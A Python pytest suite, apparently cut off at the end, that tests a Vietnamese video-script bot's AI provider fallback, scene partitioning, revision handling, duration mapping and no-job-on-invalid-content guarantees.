"""Test suite for P0.PRODUCT_VIDEO.PV03.SCRIPT.IDEA.PROMPT.TRUTH.

Covers:
1. AI Initialization Truth (Configured, Unavailable, Missing Auth, Timeout, Empty, Malformed)
2. Idea Generation Truth (Valid Input, Bounds, Empty/Overlong, Offline Deterministic, Regeneration Rotation, Handoff)
3. Script Generation Truth (Valid Structure, 5-20 Scenes, Exact Coverage, Fail-closed on Invalid)
4. Manual Script Path Truth (100% Exact Partition, No Truncation, No AI Required)
5. Regeneration & Idempotency Truth (Revision Increment, Single Active Draft, Zero Job Delta, Zero Outbox Delta)
6. Duration Truth (Options, Bounds, Scene Count Mapping, Consistent Timing Contract)
7. Platform Truth (Supported Platform Resolution, Prompt Inclusion)
8. Scene Prompt Structure (Scene Index, Narrative Text, Visual/Image Prompt, Timing, Transition)
9. Content Product Matrix Audit (All 6 products: video_idea, script_to_video, video_ai_prompt, video_ai_image, video_ai_video_reference, storyboard_video)
10. No Job Before Content Valid Invariant (Zero Project/Job/Outbox/Claim/Task Delta on Invalid Content)
11. Failure Semantics Truth (Distinct Blocker Classification, No Secret Leakage)
12. Existing SPEC-00A / SPEC-00B / PV02 Protection (Trend 80 Xu, Tier 400, Aliases)
"""

from __future__ import annotations

import asyncio
from copy import deepcopy
from unittest.mock import AsyncMock, MagicMock, patch
import pytest

import bot
from services import (
    video_final_output,
    video_idea_catalog,
    video_idea_handoff,
    video_idea_script_intake,
    video_idea_store,
    video_profile_catalog,
    video_script_product,
    video_storyboard2,
    video_tail9,
    video_uifreeze1,
)


# ==============================================================================
# 1. AI INITIALIZATION TRUTH
# ==============================================================================

@pytest.mark.anyio
async def test_ai_initialization_truth_unconfigured_fail_closed():
    """When both gemini_client and openai_client are None, generate_video_script_pack must raise RuntimeError."""
    with patch("bot.gemini_client", None), patch("bot.openai_client", None):
        with pytest.raises(RuntimeError) as exc_info:
            await bot.generate_video_script_pack("Kịch bản sản phẩm", user_id=1001)
        assert "AI provider unconfigured or unavailable" in str(exc_info.value)


@pytest.mark.anyio
async def test_ai_initialization_truth_configured_gemini_success():
    """When gemini_client succeeds with valid text, returns generated script directly."""
    mock_gemini = MagicMock()
    mock_provider = MagicMock()
    mock_provider.generate = AsyncMock(return_value={"ok": True, "text": "Kịch bản hoàn chỉnh từ Gemini"})

    with patch("bot.gemini_client", mock_gemini), patch("bot.GeminiPublicChatProvider", return_value=mock_provider):
        result = await bot.generate_video_script_pack("Kịch bản gốm sứ", user_id=1001)
        assert result == "Kịch bản hoàn chỉnh từ Gemini"


@pytest.mark.anyio
async def test_ai_initialization_truth_gemini_timeout_fallback_to_openai():
    """When Gemini times out or errors, falls back to OpenAI."""
    mock_gemini = MagicMock()
    mock_provider = MagicMock()
    mock_provider.generate = AsyncMock(side_effect=TimeoutError("Gemini timeout"))

    mock_openai = MagicMock()
    mock_choice = MagicMock()
    mock_choice.message.content = "Kịch bản hoàn chỉnh từ OpenAI fallback"
    mock_completion = MagicMock(choices=[mock_choice])
    mock_openai.chat.completions.create.return_value = mock_completion

    with patch("bot.gemini_client", mock_gemini), \
         patch("bot.GeminiPublicChatProvider", return_value=mock_provider), \
         patch("bot.openai_client", mock_openai):
        result = await bot.generate_video_script_pack("Kịch bản gốm sứ", user_id=1001)
        assert result == "Kịch bản hoàn chỉnh từ OpenAI fallback"


@pytest.mark.anyio
async def test_ai_initialization_truth_both_providers_fail_raises_runtime_error():
    """When both Gemini and OpenAI fail, raises RuntimeError without fake success."""
    mock_gemini = MagicMock()
    mock_provider = MagicMock()
    mock_provider.generate = AsyncMock(side_effect=RuntimeError("Gemini unavailable"))

    mock_openai = MagicMock()
    mock_openai.chat.completions.create.side_effect = RuntimeError("OpenAI rate limit")

    with patch("bot.gemini_client", mock_gemini), \
         patch("bot.GeminiPublicChatProvider", return_value=mock_provider), \
         patch("bot.openai_client", mock_openai):
        with pytest.raises(RuntimeError):
            await bot.generate_video_script_pack("Kịch bản", user_id=1001)


@pytest.mark.anyio
async def test_ai_initialization_truth_empty_response_fail_closed():
    """Empty or whitespace response from AI provider raises RuntimeError in pack generator."""
    mock_gemini = MagicMock()
    mock_provider = MagicMock()
    mock_provider.generate = AsyncMock(return_value={"ok": True, "text": "   "})

    with patch("bot.gemini_client", mock_gemini), \
         patch("bot.GeminiPublicChatProvider", return_value=mock_provider), \
         patch("bot.openai_client", None):
        with pytest.raises(RuntimeError):
            await bot.generate_video_script_pack("Kịch bản", user_id=1001)


# ==============================================================================
# 2. IDEA GENERATION TRUTH
# ==============================================================================

def test_idea_generation_valid_plan_and_bounds():
    """Idea catalog build_plan produces validated structure with required fields and duration/scene bounds."""
    idea_seed = {
        "title": "Trà sen Tây Hồ",
        "summary": "Quy trình ướp trà sen thủ công",
        "category": "lifestyle",
        "recommended_aspect_ratio": "9:16",
        "image_prompt_seed": "Nghệ nhân ướp trà sen sớm mai",
        "video_prompt_seed": "Cận cảnh mở búp sen và ướp trà",
    }
    plan = video_idea_catalog.build_plan(
        idea_seed,
        duration_seconds=40,
        custom_note="Tập trung vào hương thơm tự nhiên",
    )
    assert plan["selected_topic"] == "Trà sen Tây Hồ"
    assert plan["scene_count"] == 5
    assert plan["duration_seconds"] == 40
    assert plan["recommended_aspect_ratio"] == "9:16"
    assert plan["custom_note"] == "Tập trung vào hương thơm tự nhiên"
    assert "Tập trung vào hương thơm tự nhiên" in plan["image_prompt_final"]
    assert "Tập trung vào hương thơm tự nhiên" in plan["video_prompt_final"]
    assert plan["provider_called"] is False
    assert plan["job_created"] is False
    assert plan["outbox_created"] is False
    assert plan["wallet_mutations"] == 0
    assert plan["xu_charged"] == 0


def test_idea_generation_empty_and_overlong_input_handled_safely():
    """Empty idea input falls back safely; overlong custom note does not crash."""
    plan_empty = video_idea_catalog.build_plan({})
    assert plan_empty["selected_topic"] == "Ý tưởng video"
    assert plan_empty["scene_count"] in video_idea_catalog.SCENE_COUNT_OPTIONS

    overlong_note = "Yêu cầu " * 500
    plan_overlong = video_idea_catalog.build_plan({}, custom_note=overlong_note)
    assert plan_overlong["custom_note"] == overlong_note.strip()
    assert plan_overlong["job_created"] is False


def test_idea_generation_deterministic_scene_drafts_structure():
    """deterministic_scene_drafts creates editable drafts without claiming AI executed."""
    preset = {
        "title": "Cà phê pha phin truyền thống",
        "image_prompt_seed": "Từng giọt cà phê đen nhỏ xuống ly thủy tinh",
        "video_prompt_seed": "Chuyển động hơi nước và giọt cà phê",
        "voice_plan": "Giọng trầm ấm miền Nam",
        "music_plan": "Acoustic nhẹ nhàng",
    }
    drafts = video_idea_script_intake.deterministic_scene_drafts(
        preset,
        scene_count=3,
        topic="Cà phê phin",
        customer_brief="Nhấn mạnh độ sánh đậm",
    )
    assert len(drafts) == 3
    for index, scene in enumerate(drafts, 1):
        assert scene["scene_index"] == index
        assert scene["goal"] != ""
        assert scene["content"] != ""
        assert scene["image_prompt"] != ""
        assert scene["video_prompt"] != ""
        assert "Cà phê phin" in scene["image_prompt"]
        assert "Nhấn mạnh độ sánh đậm" in scene["content"]


def test_idea_generation_regeneration_rotation():
    """profile_content_suggestions with incremented revision rotates suggestions deterministically."""
    suggestions_rev0 = video_script_product.profile_content_suggestions("product_ad", goal="sales", revision=0)
    suggestions_rev1 = video_script_product.profile_content_suggestions("product_ad", goal="sales", revision=1)
    assert len(suggestions_rev0) == len(suggestions_rev1) == 5
    assert suggestions_rev0[0]["id"] != suggestions_rev1[0]["id"]


def test_idea_generation_handoff_contract_preserves_parent_state():
    """video_idea_handoff.build_parent_handoff captures all parent state cleanly."""
    parent_state = {
        "session_id": "sess_pv03_parent",
        "revision": 2,
        "flow": "script_image_video",
        "aspect_ratio": "9:16",
        "idea_return_step": "scene_plan",
    }
    handoff = video_idea_handoff.build_parent_handoff(
        parent_state,
        product_id="script_image_video",
        return_callback="vtail|back",
    )
    assert handoff["owner"] == "video_idea_parent_handoff"
    assert handoff["origin_product"] == "script_image_video"
    assert handoff["idea_parent_flow_owner"] == "scene3"
    assert handoff["idea_parent_engine_route"] == "script_to_video"
    assert handoff["return_step"] == "scene_plan"
    assert handoff["return_callback"] == "vtail|back"


# ==============================================================================
# 3. SCRIPT GENERATION TRUTH
# ==============================================================================

def test_script_generation_truth_valid_structure():
    """Valid script text partitions cleanly into 5 scenes with exact text coverage."""
    raw_script = (
        "Cảnh 1: Mặt trời mọc trên cánh đồng sen thơm ngát.\n"
        "Cảnh 2: Người thợ nhẹ nhàng chọn từng búp sen sớm.\n"
        "Cảnh 3: Trà Shan Tuyết cổ thụ được đưa vào lòng hoa.\n"
        "Cảnh 4: Buộc chặt lá sen để ủ trọn hương hoa đất trời.\n"
        "Cảnh 5: Thưởng thức chén trà sen nồng nàn thanh tao."
    )
    partition = video_script_product.exact_partition(raw_script, 5)
    assert partition["ok"] is True
    assert partition["scene_count"] == 5
    assert len(partition["scenes"]) == 5
    assert partition["coverage"]["no_truncation"] is True
    assert partition["coverage"]["exact_match"] is True
    assert partition["coverage"]["coverage_percent"] == 100
    assert "".join(partition["scenes"]) == raw_script


def test_script_generation_truth_semantic_beats_consistency():
    """semantic_beats preserves exact text and generates structured beats per scene."""
    raw_script = (
        "Cảnh 1: Khởi đầu ngày mới tại xưởng mộc truyền thống.\n"
        "Cảnh 2: Lựa chọn thân gỗ lim trăm tuổi chắc nịch.\n"
        "Cảnh 3: Đục đẽo tỉ mỉ từng đường nét hoa văn tinh xảo.\n"
        "Cảnh 4: Đánh bóng bề mặt gỗ cho vân nổi rực rỡ.\n"
        "Cảnh 5: Thành phẩm chiếc bàn sang trọng đặt giữa gian phòng."
    )
    beats_result = video_script_product.semantic_beats(raw_script, 5)
    assert beats_result["ok"] is True
    beats = beats_result["semantic_beats"]
    assert len(beats) == 5
    for idx, beat in enumerate(beats, 1):
        assert beat["source_text_exact"] != ""
        assert beat["main_idea"] != ""
        assert beat["action"] != ""
        assert beat["source_start"] < beat["source_end"]


def test_script_generation_truth_invalid_content_fail_closed():
    """Empty script or text too short for scene count fails closed without fake partition."""
    empty_res = video_script_product.exact_partition("", 5)
    assert empty_res["ok"] is False
    assert empty_res["reason"] == "empty_script"

    short_res = video_script_product.exact_partition("abc", 5)
    assert short_res["ok"] is False
    assert short_res["reason"] == "script_too_short_for_scene_count"


# ==============================================================================
# 4. MANUAL SCRIPT PATH TRUTH
# ==============================================================================

def test_manual_script_truth_exact_partition_100_percent():
    """parse_script guarantees 100% preservation of manual customer script."""
    manual_text = (
        "Đoạn 1: Giới thiệu bánh mì phố cổ Hà Nội vỏ giòn ruột xốp.\n\n"
        "Đoạn 2: Pate gan ngỗng thơm béo tự làm theo công thức gia truyền.\n\n"
        "Đoạn 3: Thêm giò lụa, dưa góp, rau thơm và sốt ớt cay nồng.\n\n"
        "Đoạn 4: Nướng trên than hoa nóng rực cho vỏ bánh giòn tan.\n\n"
        "Đoạn 5: Khách hàng thưởng thức ngon lành giữa phố tấp nập."
    )
    parsed = video_script_product.parse_script(manual_text)
    assert parsed["coverage"]["exact_match"] is True
    assert parsed["coverage"]["no_truncation"] is True
    assert parsed["coverage"]["coverage_percent"] == 100
    assert "".join(parsed["proposed_scenes"]) == manual_text


def test_manual_script_truth_state_contract_validation():
    """state_contract validates exact coverage and raises ValueError if incomplete."""
    source = "Cảnh 1: A. Cảnh 2: B. Cảnh 3: C. Cảnh 4: D. Cảnh 5: E."
    partition = video_script_product.exact_partition(source, 5)
    valid_state = {
        "manual_script_raw": source,
        "scene_count": 5,
        "scene_count_confirmed": True,
        "parsed_script_scenes": partition["scenes"],
        "parsed_script_ranges": partition["ranges"],
        "script_coverage": partition["coverage"],
    }
    validated = video_script_product.state_contract(valid_state)
    assert validated["script_exact_match"] is True
    assert validated["script_sha256"] == partition["coverage"]["source_sha256"]

    # Altered scene text must fail
    invalid_state = deepcopy(valid_state)
    invalid_state["parsed_script_scenes"][0] = "Tampered text"
    with pytest.raises(ValueError, match="script_coverage_incomplete"):
        video_script_product.state_contract(invalid_state)


def test_manual_script_intake_split_methods():
    """split_manual_script handles headings, numbered, paragraphs and sentences."""
    heading_text = "Cảnh 1: Mở đầu\nCảnh 2: Thân bài\nCảnh 3: Kết bài"
    res1 = video_idea_script_intake.split_manual_script(heading_text, max_scenes=10)
    assert res1["ok"] is True
    assert res1["method"] == "scene_heading"
    assert res1["scene_count"] == 3

    numbered_text = "1. Bước một chuẩn bị\n2. Bước hai thực hiện\n3. Bước ba kiểm tra"
    res2 = video_idea_script_intake.split_manual_script(numbered_text, max_scenes=10)
    assert res2["ok"] is True
    assert res2["method"] == "numbered_heading"
    assert res2["scene_count"] == 3


# ==============================================================================
# 5. REGENERATION & IDEMPOTENCY TRUTH
# ==============================================================================

@pytest.mark.anyio
async def test_regeneration_revision_increment_and_zero_job_delta():
    """Regenerate action increments revision and preserves choices without creating jobs."""
    user_id = 888101
    initial_draft = {
        "script_topic": "Áo dài lụa Hà Đông",
        "script_duration_seconds": 40,
        "script_entry_scene_count": 5,
        "script_ai_revision": 1,
    }
    session = {"user_id": user_id, "draft": initial_draft}
    query = MagicMock()

    script_rev2 = "Cảnh 1: Lụa tơ tằm. Cảnh 2: Dệt vải. Cảnh 3: Nhuộm màu. Cảnh 4: Cắt may. Cảnh 5: Trình diễn."

    with patch("bot.generate_video_script_pack", new_callable=AsyncMock, return_value=script_rev2), \
         patch("bot.video_flow7_store_script_proposal", return_value=(session, {"scenes": ["1", "2", "3", "4", "5"]})), \
         patch("bot.task3d_session_step") as mock_step, \
         patch("bot.safe_edit_or_send", new_callable=AsyncMock), \
         patch("bot.video_script_render_step", new_callable=AsyncMock):

        # Trigger generation with revision 2
        session["draft"]["script_ai_revision"] = 2
        await bot.video_script_generate_ai(query, user_id, session, "vi")

        mock_step.assert_called_once()
        step_args = mock_step.call_args[1]
        assert step_args.get("script_ai_revision") == 2
        assert step_args.get("job_created") is False
        assert step_args.get("outbox_created") is False
        assert step_args.get("xu_charged") == 0


def test_regeneration_double_click_draft_stability():
    """Updating draft multiple times in task3d_session_step maintains a single active draft dict."""
    user_id = 888102
    with patch("bot.get_video_session", return_value={"user_id": user_id, "draft": {}}), \
         patch("bot.save_video_session", side_effect=lambda uid, s: s):

        s1 = bot.task3d_session_step(user_id, "script_ai_duration", script_duration_seconds=40)
        s2 = bot.task3d_session_step(user_id, "script_ai_duration", script_duration_seconds=40)
        assert s1["draft"]["script_duration_seconds"] == 40
        assert s2["draft"]["script_duration_seconds"] == 40
        assert s2.get("job_created", False) is False
        assert s2.get("outbox_created", False) is False


def test_task3d_session_step_increment_script_ai_revision_atomic():
    """increment_script_ai_revision=True atomically increments draft script_ai_revision."""
    user_id = 888102
    draft = {"script_ai_revision": 1}
    session = {"user_id": user_id, "draft": draft}
    with patch("bot.get_video_session", return_value=session), \
         patch("bot.save_video_session", side_effect=lambda uid, s: s):

        s1 = bot.task3d_session_step(user_id, "script_ai_duration", increment_script_ai_revision=True)
        assert s1["draft"]["script_ai_revision"] == 2
        s2 = bot.task3d_session_step(user_id, "script_ai_duration", increment_script_ai_revision=True)
        assert s2["draft"]["script_ai_revision"] == 3


@pytest.mark.anyio
async def test_regeneration_stale_invocation_dropped_early():
    """If current session revision is already ahead, stale invocation drops immediately without calling AI."""
    user_id = 888103
    stale_session = {"user_id": user_id, "draft": {"script_ai_revision": 1, "script_topic": "Test"}}
    active_session = {"user_id": user_id, "draft": {"script_ai_revision": 2, "script_topic": "Test"}}
    query = MagicMock()

    with patch("bot.get_video_session", return_value=active_session), \
         patch("services.video_script_product.build_ai_prompt") as mock_build_prompt, \
         patch("bot.generate_video_script_pack", new_callable=AsyncMock) as mock_generate:

        result = await bot.video_script_generate_ai(query, user_id, stale_session, "vi")
        assert result == active_session
        mock_build_prompt.assert_not_called()
        mock_generate.assert_not_called()


@pytest.mark.anyio
async def test_regeneration_concurrent_revision_race_drops_stale_completion():
    """When a slower task finishes with an older revision, it must drop and not overwrite newer draft."""
    user_id = 888104
    query = MagicMock()
    session_rev1 = {
        "user_id": user_id,
        "draft": {
            "script_topic": "Cà phê",
            "script_ai_revision": 1,
            "script_entry_scene_count": 5,
        }
    }
    session_rev2 = {
        "user_id": user_id,
        "draft": {
            "script_topic": "Cà phê",
            "script_ai_revision": 2,
            "script_entry_scene_count": 5,
        }
    }

    current_storage = {"session": deepcopy(session_rev1)}

    def fake_get_video_session(uid):
        return deepcopy(current_storage["session"])

    async def fake_generate(prompt, uid):
        current_storage["session"] = deepcopy(session_rev2)
        return "Cảnh 1: Cũ. Cảnh 2: Cũ. Cảnh 3: Cũ. Cảnh 4: Cũ. Cảnh 5: Cũ."

    with patch("bot.get_video_session", side_effect=fake_get_video_session), \
         patch("bot.generate_video_script_pack", side_effect=fake_generate), \
         patch("bot.video_flow7_store_script_proposal", return_value=(session_rev1, {"scenes": ["1", "2", "3", "4", "5"]})), \
         patch("bot.task3d_session_step") as mock_step, \
         patch("bot.safe_edit_or_send", new_callable=AsyncMock):

        res = await bot.video_script_generate_ai(query, user_id, session_rev1, "vi")

        mock_step.assert_not_called()
        assert res["draft"]["script_ai_revision"] == 2


# ==============================================================================
# 6. DURATION TRUTH
# ==============================================================================

def test_duration_truth_options_and_bounds():
    """duration_options and duration_bounds calculate correct seconds from scene count."""
    assert video_script_product.duration_options(5) == (40, 60, 75)
    assert video_script_product.duration_bounds(5) == (40, 75)

    assert video_script_product.duration_options(10) == (80, 120, 150)
    assert video_script_product.duration_bounds(10) == (80, 150)

    assert video_script_product.duration_options(20) == (160, 240, 300)
    assert video_script_product.duration_bounds(20) == (160, 300)


def test_duration_truth_estimated_scene_count():
    """estimated_scene_count maps duration seconds to bounded scene counts (5 to 20)."""
    assert video_script_product.estimated_scene_count(10) == 5  # minimum clamp
    assert video_script_product.estimated_scene_count(40) == 5
    assert video_script_product.estimated_scene_count(80) == 10
    assert video_script_product.estimated_scene_count(160) == 20
    assert video_script_product.estimated_scene_count(500) == 20  # maximum clamp


def test_duration_truth_idea_catalog_mapping():
    """video_idea_catalog duration and scene count mapping match DURATION_OPTIONS."""
    assert video_idea_catalog.DURATION_OPTIONS == (8, 16, 24, 40, 80, 160)
    assert video_idea_catalog.SCENE_COUNT_OPTIONS == (1, 2, 3, 5, 10, 20)

    for scenes, duration in zip(video_idea_catalog.SCENE_COUNT_OPTIONS, video_idea_catalog.DURATION_OPTIONS):
        assert video_idea_catalog.duration_for_scene_count(scenes) == duration
        assert video_idea_catalog.scene_count_for_duration(duration) == scenes


# ==============================================================================
# 7. PLATFORM TRUTH
# ==============================================================================

def test_platform_truth_supported_platforms():
    """Supported platforms dictionary contains required targets and formats."""
    expected_keys = {"tiktok_reels", "youtube_shorts", "facebook", "ads_landing", "multi"}
    assert set(video_script_product.PLATFORMS.keys()) == expected_keys


def test_platform_truth_build_ai_prompt_embedding():
    """build_ai_prompt includes resolved platform label in prompt text."""
    draft = {
        "script_topic": "Nước hoa hồng hữu cơ",
        "script_platform_label": "TikTok / Reels",
        "script_entry_scene_count": 5,
        "script_duration_seconds": 40,
    }
    prompt = video_script_product.build_ai_prompt(draft)
    assert "Nền tảng: TikTok / Reels" in prompt
    assert "Số cảnh mục tiêu: 5 cảnh" in prompt
    assert "Thời lượng mục tiêu: 40 giây" in prompt


# ==============================================================================
# 8. SCENE PROMPT STRUCTURE TRUTH
# ==============================================================================

def test_scene_prompt_structure_fields_present():
    """Deterministic scene drafts contain all required fields per scene."""
    preset = {
        "title": "Quảng cáo đồng hồ cao cấp",
        "image_prompt_seed": "Mặt số sapphire phản chiếu ánh sáng",
        "video_prompt_seed": "Kim giây chuyển động mượt mà",
        "voice_plan": "Giọng chuẩn sang trọng",
        "music_plan": "Cổ điển tinh tế",
    }
    scenes = video_idea_script_intake.deterministic_scene_drafts(preset, scene_count=5)
    for s in scenes:
        assert "scene_index" in s
        assert "goal" in s
        assert "content" in s
        assert "image_prompt" in s
        assert "video_prompt" in s
        assert "transition" in s
        assert "end_state" in s


def test_scene_prompt_structure_storyboard_slots():
    """Storyboard empty scene structure preserves start and end image slots for I2V."""
    scene = video_storyboard2._empty_scene(1)
    assert scene["scene_index"] == 1
    assert scene["start_image"]["slot"] == "start"
    assert scene["start_image"]["status"] == "missing"
    assert scene["end_image"]["slot"] == "end"
    assert scene["end_image"]["status"] == "not_selected"


def test_scene_prompt_structure_storyboard_compile_video_prompts():
    """Storyboard compile_video_prompts generates per-scene prompts without calling providers."""
    state = video_storyboard2.default_state()
    state = video_storyboard2.set_scene_count(state, 2)
    state = video_storyboard2.apply_content(state, "Cảnh 1: Mở đầu. Cảnh 2: Kết thúc.", mode="prompt")
    img1 = video_storyboard2.image_record(scene_index=1, slot="start", file_id="f1", source_type="user_upload")
    img2 = video_storyboard2.image_record(scene_index=2, slot="start", file_id="f2", source_type="user_upload")
    state = video_storyboard2.assign_image(state, 1, "start", img1)
    state = video_storyboard2.assign_image(state, 2, "start", img2)
    state = video_storyboard2.compile_video_prompts(state)
    for scene in state["scenes"]:
        assert scene["video_prompt"] != ""
        assert scene["duration_seconds"] == video_storyboard2.SCENE_SECONDS


# ==============================================================================
# 9. CONTENT PRODUCT MATRIX AUDIT (ALL 6 PRODUCTS)
# ==============================================================================

def test_content_product_matrix_audit_all_six():
    """Audit the content preparation and ready-for-confirm contract across all 6 products."""
    products = [
        "video_idea",
        "script_to_video",
        "video_ai_prompt",
        "video_ai_image",
        "video_ai_video_reference",
        "storyboard_video",
    ]
    expected_canonicals = {
        "video_idea": "video_idea",
        "script_to_video": "script_image_video",
        "video_ai_prompt": "video_ai_prompt",
        "video_ai_image": "video_ai_image",
        "video_ai_video_reference": "video_ai_video_reference",
        "storyboard_video": "storyboard_prompt",
    }
    for product in products:
        # Commercial route mapping check
        canonical_route = video_final_output.route_for_product_type(product)
        assert canonical_route is not None, f"Product {product} must resolve to a valid engine route"

        # Contract and adapter check
        contract = video_tail9.commercial_contract(product)
        adapter = video_tail9.adapter_for(product)
        assert contract is not None, f"Product {product} must have a valid commercial contract"
        assert adapter is not None, f"Product {product} must have a valid adapter"
        assert adapter["canonical_product_type"] == expected_canonicals[product]


def test_content_product_matrix_storyboard_preflight_truth():
    """Storyboard preflight blocks confirmation until content and images are valid."""
    state = video_storyboard2.default_state()
    # Incomplete state
    pf_incomplete = video_storyboard2.preflight(state)
    assert pf_incomplete["ok"] is False

    # Configure minimum valid storyboard
    state = video_storyboard2.set_scene_count(state, 2)
    state = video_storyboard2.set_ratio(state, "9:16")
    state = video_storyboard2.apply_content(state, "Cảnh 1: Mở đầu ấn tượng. Cảnh 2: Kết thúc trọn vẹn.", mode="manual")
    state = video_storyboard2.approve_content(state)
    # Assign valid images
    img1 = video_storyboard2.image_record(scene_index=1, slot="start", file_id="f1", source_type="user_upload")
    img2 = video_storyboard2.image_record(scene_index=2, slot="start", file_id="f2", source_type="user_upload")
    state = video_storyboard2.assign_image(state, 1, "start", img1)
    state = video_storyboard2.assign_image(state, 2, "start", img2)
    state = video_storyboard2.confirm_existing_image_gate(state)
    state["middle_complete"] = True
    state = video_storyboard2.compile_video_prompts(state)
    state = video_storyboard2.build_transitions(state)
    state["addons_ready"] = True

    pf_complete = video_storyboard2.preflight(state)
    assert pf_complete["ok"] is True
    assert pf_complete["error"] == "" if "error" in pf_complete else True
    assert pf_complete["blockers"] == []


# ==============================================================================
# 10. NO JOB BEFORE CONTENT VALID
# ==============================================================================

@pytest.mark.anyio
async def test_no_job_before_content_valid():
    """Failed generation, unparseable input, or invalid draft causes zero job/outbox delta."""
    user_id = 777101
    query = MagicMock()
    session = {
        "user_id": user_id,
        "draft": {
            "script_topic": "Nội dung lỗi",
            "script_duration_seconds": 40,
            "script_entry_scene_count": 5,
        },
    }

    with patch("bot.generate_video_script_pack", new_callable=AsyncMock, side_effect=RuntimeError("AI Down")), \
         patch("bot.task3d_session_step") as mock_step, \
         patch("bot.safe_edit_or_send", new_callable=AsyncMock), \
         patch("bot.video_script_duration_keyboard", return_value=MagicMock()):

        await bot.video_script_generate_ai(query, user_id, session, "vi")

        mock_step.assert_called_once()
        kwargs = mock_step.call_args[1]
        assert kwargs.get("job_created") is False
        assert kwargs.get("outbox_created") is False
        assert kwargs.get("xu_charged") == 0


# ==============================================================================
# 11. FAILURE SEMANTICS, ZERO SIDE EFFECTS & PUBLIC INPUT TRUTH
# ==============================================================================

@pytest.mark.anyio
async def test_failure_semantics_ai_unconfigured_production_handler():
    """AI unconfigured fails closed via production handler, returning exact notice and 0 side-effects."""
    user_id = 888101
    query = MagicMock()
    query.edit_message_text = AsyncMock()
    session = {
        "user_id": user_id,
        "draft": {
            "script_topic": "Sản phẩm test unconfigured",
            "script_duration_seconds": 40,
            "script_entry_scene_count": 5,
            "script_ai_revision": 1,
        },
    }
    with patch("bot.generate_video_script_pack", new_callable=AsyncMock, side_effect=RuntimeError("AI unconfigured: missing provider API key")), \
         patch("bot.task3d_session_step") as mock_step, \
         patch("bot.safe_edit_or_send", new_callable=AsyncMock) as mock_send, \
         patch("bot.video_script_duration_keyboard", return_value=MagicMock()):

        await bot.video_script_generate_ai(query, user_id, session, "vi")

        mock_step.assert_called_once()
        kwargs = mock_step.call_args[1]
        assert kwargs.get("script_provider_error") == "RuntimeError"
        assert kwargs.get("job_created") is False
        assert kwargs.get("outbox_created") is False
        assert kwargs.get("xu_charged") == 0
        assert kwargs.get("provider_called") is True
        assert mock_send.call_count >= 1
        sent_text = mock_send.call_args[0][1]
        assert "⚠️ Chưa tạo được kịch bản từ nguồn AI" in sent_text


@pytest.mark.anyio
async def test_failure_semantics_provider_timeout_production_handler():
    """Provider timeout fails closed via production handler, returning exact notice and 0 side-effects."""
    user_id = 888102
    query = MagicMock()
    query.edit_message_text = AsyncMock()
    session = {
        "user_id": user_id,
        "draft": {
            "script_topic": "Sản phẩm test timeout",
            "script_duration_seconds": 40,
            "script_entry_scene_count": 5,
            "script_ai_revision": 1,
        },
    }
    with patch("bot.generate_video_script_pack", new_callable=AsyncMock, side_effect=TimeoutError("upstream provider timed out")), \
         patch("bot.task3d_session_step") as mock_step, \
         patch("bot.safe_edit_or_send", new_callable=AsyncMock) as mock_send, \
         patch("bot.video_script_duration_keyboard", return_value=MagicMock()):

        await bot.video_script_generate_ai(query, user_id, session, "vi")

        mock_step.assert_called_once()
        kwargs = mock_step.call_args[1]
        assert kwargs.get("script_provider_error") == "TimeoutError"
        assert kwargs.get("job_created") is False
        assert kwargs.get("outbox_created") is False
        assert kwargs.get("xu_charged") == 0
        assert mock_send.call_count >= 1
        sent_text = mock_send.call_args[0][1]
        assert "⚠️ Chưa tạo được kịch bản từ nguồn AI" in sent_text


@pytest.mark.anyio
async def test_failure_semantics_empty_response_production_handler():
    """Empty AI response produces exact 'empty_script' blocker and zero side effects."""
    user_id = 888103
    query = MagicMock()
    query.edit_message_text = AsyncMock()
    session = {
        "user_id": user_id,
        "draft": {
            "script_topic": "Sản phẩm test empty response",
            "script_duration_seconds": 40,
            "script_entry_scene_count": 5,
            "script_ai_revision": 1,
        },
    }
    with patch("bot.generate_video_script_pack", new_callable=AsyncMock, return_value="   \n   "), \
         patch("bot.task3d_session_step") as mock_step, \
         patch("bot.safe_edit_or_send", new_callable=AsyncMock) as mock_send, \
         patch("bot.video_script_duration_keyboard", return_value=MagicMock()):

        await bot.video_script_generate_ai(query, user_id, session, "vi")

        mock_step.assert_called_once()
        kwargs = mock_step.call_args[1]
        assert kwargs.get("script_provider_error") == "empty_script"
        assert kwargs.get("job_created") is False
        assert kwargs.get("outbox_created") is False
        assert kwargs.get("xu_charged") == 0
        assert mock_send.call_count >= 1
        sent_text = mock_send.call_args[0][1]
        assert "⚠️ Nguồn AI chưa trả về kịch bản có nội dung" in sent_text


@pytest.mark.anyio
async def test_failure_semantics_invalid_manual_input_production_handler():
    """Invalid manual inputs raise exact production errors and return exact UI notices with 0 side effects."""
    from services import video_flow7

    user_id = 888104
    # Missing script
    with pytest.raises(ValueError) as exc1:
        bot.video_flow7_store_script_proposal(user_id, "", source="customer")
    assert str(exc1.value) == "script_missing"

    # Over 20 scenes script
    with patch("services.video_flow7.parse_script_proposal", return_value={"source_text": "sample", "proposed_scene_count": 25, "coverage": {"no_truncation": True, "exact_match": True}}):
        with pytest.raises(ValueError) as exc2:
            bot.video_flow7_store_script_proposal(user_id, "sample", source="customer")
        assert str(exc2.value) == "script_scene_count_over_limit"

    # Incomplete coverage
    with patch("services.video_flow7.parse_script_proposal", return_value={"source_text": "sample", "proposed_scene_count": 3, "coverage": {"no_truncation": False, "exact_match": False}}):
        with pytest.raises(ValueError) as exc3:
            bot.video_flow7_store_script_proposal(user_id, "sample", source="customer")
        assert str(exc3.value) == "script_coverage_incomplete"

    # Script contract gate blockers
    assert video_flow7.script_contract_gate({"manual_script_raw": ""})["blocker"] == "script_missing"
    assert video_flow7.script_contract_gate({"manual_script_raw": "abc", "scene_count": 25})["blocker"] == "script_scene_count_invalid"
    assert video_flow7.script_contract_gate({"manual_script_raw": "abc", "scene_count": 5, "scene_count_confirmed": False})["blocker"] == "script_scene_count_not_confirmed"

    # End-to-end via handle_video_product_pending_text awaiting_existing_script
    update = MagicMock()
    update.effective_user.id = user_id
    update.message = MagicMock()
    update.message.reply_text = AsyncMock()
    context = MagicMock()

    with patch("bot.get_video_session", return_value={"product_id": "script_image_video", "step": "awaiting_existing_script", "current_step": "awaiting_existing_script", "draft": {}}):
        # 1. Empty text input
        update.message.text = "   "
        handled = await bot.handle_video_product_pending_text(update, context)
        assert handled is True
        update.message.reply_text.assert_called()
        assert "⚠️ Kịch bản đang trống" in update.message.reply_text.call_args[0][0]

        # 2. Overlimit input via production handler branch
        with patch("bot.video_flow7_store_script_proposal", side_effect=ValueError("script_scene_count_over_limit")):
            update.message.text = "too long script content"
